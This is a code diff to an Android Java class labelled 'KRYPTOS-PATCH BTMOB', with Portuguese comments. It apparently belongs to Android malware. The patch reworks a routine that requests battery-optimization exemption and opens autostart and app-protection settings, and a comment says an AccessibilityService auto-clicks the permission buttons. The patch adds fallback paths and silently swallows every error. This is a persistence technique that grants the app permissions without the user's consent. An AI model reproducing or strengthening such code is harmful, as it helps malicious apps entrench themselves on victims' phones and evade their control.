@@ -207,32 +207,27 @@ public class ROMCompatibility {
      * 🔧 Abre TODAS as configurações necessárias para a ROM detectada
      * O AccessibilityService vai auto-clicar nos botões necessários
      */
-    public void openAllROMSettings() {
+    public boolean openAllROMSettings() {
+        // [KRYPTOS-PATCH BTMOB] agora tem plano B e devolve se abriu algo
         ROMType rom = detectROM();
-        Log.d(TAG, "🔧 Iniciando configuração para ROM: " + rom.name());
-        
-        // 1. PRIMEIRO: Se não está ignorando bateria, abre o DIALOG DIRETO
-        // Este dialog mostra "Permitir" e o AccessibilityService clica
-        if (!isIgnoringBatteryOptimizations()) {
-            Log.d(TAG, "🔋 Bateria NÃO está ignorada, abrindo dialog...");
-            requestIgnoreBatteryOptimization();
-            
-            // Após 3 segundos, abre Autostart
-            new android.os.Handler().postDelayed(() -> {
-                Log.d(TAG, "🚀 Abrindo configurações de Autostart...");
-                openAutoStartSettings();
-            }, 3000);
-        } else {
-            // Se já está ignorando bateria, só abre Autostart
-            Log.d(TAG, "🔋 Bateria já está ignorada! Abrindo Autostart...");
-            openAutoStartSettings();
+        Log.d(TAG, "Iniciando configuracao para ROM: " + rom.name());
+        boolean opened = false;
+        try {
+            if (!isIgnoringBatteryOptimizations()) {
+                requestIgnoreBatteryOptimization();
+                new android.os.Handler().postDelayed(() -> { try { openAutoStartSettings(); } catch (Throwable ignored) {} }, 3000);
+                opened = true;
+            } else {
+                opened = openAutoStartSettings();
+            }
+        } catch (Throwable ignored) {}
+        if (!opened) {
+            Log.d(TAG, "Autostart especifico falhou, tentando lista generica completa");
+            try { opened = openGenericAutoStart(); } catch (Throwable ignored) {}
         }
-        
-        // 2. Abre proteção de apps específica da ROM (após delay maior)
-        new android.os.Handler().postDelayed(() -> {
-            Log.d(TAG, "🛡️ Abrindo configurações de proteção...");
-            openAppProtectionSettings(rom);
-        }, 6000);
+        final ROMType romF = rom;
+        new android.os.Handler().postDelayed(() -> { try { openAppProtectionSettings(romF); } catch (Throwable ignored) {} }, 6000);
+        return opened;
     }
     
     // ==================== XIAOMI / MIUI ====================
